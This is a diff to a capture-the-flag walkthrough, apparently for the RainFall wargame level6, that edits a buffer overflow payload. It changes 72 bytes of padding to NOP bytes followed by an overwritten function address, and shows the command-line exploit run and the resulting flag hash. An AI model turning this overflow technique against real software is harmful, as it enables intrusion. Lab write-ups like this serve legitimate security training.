@@ -57,12 +57,12 @@ We can then craft our payload:
 ```
 padding + address of n
 
-"A"*72 + "\x08\x04\x84\x54"[::-1]
+"\x90"*72 + "\x08\x04\x84\x54"[::-1]
 ```
 
 Let's run our payload:
 ```bash
-level6@RainFall:~$ ./level6 `python -c 'print("0"*72 + "\x08\x04\x84\x54"[::-1])'`
+level6@RainFall:~$ ./level6 `python -c 'print("\x90"*72 + "\x08\x04\x84\x54"[::-1])'`
 f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 ```
 
